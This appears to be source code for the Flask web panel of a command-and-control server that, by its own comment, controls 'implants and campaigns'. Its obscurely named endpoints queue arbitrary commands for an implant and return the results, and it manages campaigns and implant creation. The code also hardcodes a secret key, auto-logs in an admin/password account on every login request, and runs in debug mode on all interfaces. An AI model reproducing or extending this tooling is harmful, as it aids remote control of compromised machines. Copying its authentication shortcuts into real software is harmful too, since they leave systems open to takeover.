from flask import Flask, render_template, flash, request, jsonify, g, current_app,url_for, redirect, make_response, session
from flask_sqlalchemy import SQLAlchemy
import base64
from Implant import ImplantSingleton
from flask_login import LoginManager, login_required, current_user, login_user, logout_user
from Database import Database
#from wtforms import Form, TextField, TextAreaField, validators, StringField, SubmitField
# This is the web app to control implants and campaigns

db = Database()
Imp=ImplantSingleton.instance


app = Flask(__name__)
app.config.from_object(__name__)
app.config['SECRET_KEY'] = '7d441f27d441f27567d441f2b6176a'
login = LoginManager(app)
login.init_app(app)

@app.context_processor
def inject_dict_for_all_templates():
    # -- Confirm if this is secure --#
    if current_user:
        print(current_user)
        return dict(campaignlist=db.Get_AllUserCampaigns(current_user.user_email))
    # return dict(mydict=code_to_generate_dict())

## GARBAGE
@login.user_loader
def load_user(id):
    return db.Get_UserObject(id)
@app.before_request
def before_request():
    return
@app.after_request
def add_header(r):
    return r
@app.errorhandler(404)
def page_not_found(e):
    return redirect(url_for('BaseHomePage'),404) # This should be a proper 404?
@app.errorhandler(401)
def page_not_found(e):
    return redirect(url_for(('login')), 401)
# -- AUTHENTICATION --#
def AUTO_LOGIN_REMOVE():
    a = db.Get_UserObjectLogin("admin","password")
    # a.authenticated=True
    print(a.is_authenticated())
    login_user(a)
    print("::", a.is_authenticated())
@app.route("/login", methods =['GET','POST'])
def login():
    AUTO_LOGIN_REMOVE()
    if request.method=="POST":
        a = db.Get_UserObjectLogin(request.form['email'],request.form['password'])
        #a.authenticated=True
        print(a.is_authenticated())
        login_user(a)
        print("::",a.is_authenticated())
        return redirect(url_for("BaseHomePage"))
    return render_template('login.html')
@app.route("/logout")
@login_required
def logout():
    print(current_user.uid, current_user.user_email)
    if (current_user.is_authenticated):
        logout_user()
        return redirect(url_for("login"))
    else:
        return redirect(url_for("login"))

# -- PURGE --#
# -- PURGE --#

@app.route("/abc", methods =['GET','POST'])
@login_required
def management():
    return render_template('main.html')

@app.route("/aab", methods =['GET','POST'])
@login_required
def cmdreturn():
    #print( Imp.Get_CommandResult())
    return str(Imp.Get_CommandResult())
#Endpoint query

@app.route("/aaa/<cmd>", methods =['GET','POST'])
@app.route("/aaa", methods =['GET','POST'])
@login_required
def aaa(cmd=0):
    if request.method=="GET":
        Imp.AddCommand(cmd)
        return "a"
    else:
        Imp.AddCommand(request.form['ta'])
        return "OK."
# -- END PURGE --#
# -- END PURGE --#

# -- NEW ENDPOINTS -- #

@app.route("/")
@login_required
def BaseHomePage():
    a = db.Get_AllUserCampaigns(current_user.user_email)
    return render_template("welcome.html")


@app.route("/<id>/")
@login_required
def BaseImplantPage(id):
    return render_template("ImplantMain.html")
@login_required
@app.route ("/<id>/settings")
def BaseImplantSettings(id):
    return "2"



@app.route("/CreateCampaign", methods=['GET','POST'])
@app.route("/Implant/New", methods=['GET','POST'])
@login_required
def CreateNewItem():
    if request.method=="POST":
        if 'CreateCampaign' in request.form:
            print("Building Campaign")
            print(request.form)
            #print(dir())
            # WOrk out if Implant or Campaign
            db.Create_Campaign(request.form['title'],current_user.user_email,request.form['description'])
            return redirect(url_for('BaseHomePage'))
        elif 'CreateImplant' in request.form:
            cid = request.form['CreateImplant']
            title = request.form['description']
            url = request.form['url']

    else:
        return render_template('CreateCampaign.html')


@app.route("/Implant/<iid>/Generate", methods=["GET"])
@login_required
def ImplantGenerate(iid):
    return "405"

if __name__ == "__main__":
    app.run(debug=True, host='0.0.0.0', port=5001, threaded=True)
    print ("App running")